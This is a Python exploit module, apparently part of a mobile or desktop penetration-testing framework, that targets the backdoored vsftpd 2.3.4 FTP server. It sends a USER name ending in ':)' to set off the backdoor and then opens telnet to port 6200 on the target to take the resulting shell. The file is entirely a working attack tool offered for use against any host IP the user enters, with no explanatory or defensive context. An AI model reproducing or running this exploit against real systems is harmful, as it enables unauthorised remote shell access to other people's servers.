import os, sys
sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..', '..'))
import core
class vsftpdBackdoorMenu(core.Exploit):
    def generate(self, p):
        p += self.rand_text(7)
        p += ":)"
        return p
    def deliver(self, p):
        self.init_deliver()
        s = self.connect()
        s.send("USER " + p)
        s.recv(1024)
        self.disconnect(s)
    def do_start(self, args):
        if args:
          print "*** Unknown argument: " + args
          return
        for v in self.variables.keys():
            if self.variables[v]:
                pass
            else:
                print "*** Variable not set: " + v
                return
        payload = self.init()
        if payload == 1:
            return
        payload = self.generate(payload)
        if payload == 1:
            return 
        self.deliver(payload)
        print "[+]Payload sent."
        print "[*]Attempting to connect..."
        if self.config.pc == "yes":
            code = self.subprocess.call(["telnet", self.variables["host"], "6200"], stdin=self.sys.stdin, stdout=self.sys.stdout)
            if code != 0:
                print "[-]Host could not be reached. It might be behind a firewall. Or the exploit failed. :("
        else:
            code = self.subprocess.call(["/data/data/com.raveneus.penedroid/files/telnet", self.variables["host"], "6200"], stdin=self.sys.stdin, stdout=self.sys.stdout) 
            if code != 0:
                print "[-]Host could not be reached. It might be behind a firewall. Or the exploit failed. :("
def main(s):
  menu = vsftpdBackdoorMenu("vsftpd_backdoor", "Linux with vsftpd v2.3.4", "", {"host":""}, {"host":"the IP of the target"})
  menu.cmdloop()
if __name__ == '__main__':
  main("")
